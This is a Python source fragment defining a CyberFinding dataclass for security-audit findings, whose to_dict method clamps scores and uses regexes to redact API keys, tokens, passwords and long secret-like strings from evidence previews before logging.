@dataclass(frozen=True)
class CyberFinding:
    """Audit-safe cyber finding generated by input or event analysis."""

    finding_id: str
    category: str
    finding_type: str
    name: str
    description: str
    severity: float
    confidence: float
    match_count: int = 1
    evidence_preview: str = ""
    pattern_fingerprint: str = ""
    remediation: str = ""
    source: str = "cyber_safety"
    tags: Tuple[str, ...] = field(default_factory=tuple)
    references: Tuple[str, ...] = field(default_factory=tuple)

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["severity"] = clamp_score(data["severity"])
        data["confidence"] = clamp_score(data["confidence"], default=0.75)
    
        # Apply aggressive redaction to evidence_preview
        preview = data.get("evidence_preview", "")
        # Matches api_key=..., secret=..., token=..., password=... (with or without quotes)
        preview = re.sub(
            r'(?i)(api[_-]?key|secret|token|password|passwd|private_key|client_secret|access_token)\s*[:=]\s*[\'"]?[^\s,&;]+',
            r'\1=[REDACTED]',
            preview
        )
        # Also redact long alphanumeric strings that look like raw secrets
        preview = re.sub(r'\b[a-zA-Z0-9_]{20,}\b', '[REDACTED]', preview)
        data["evidence_preview"] = redact_text(preview, max_length=240)
    
        return sanitize_for_logging(data)


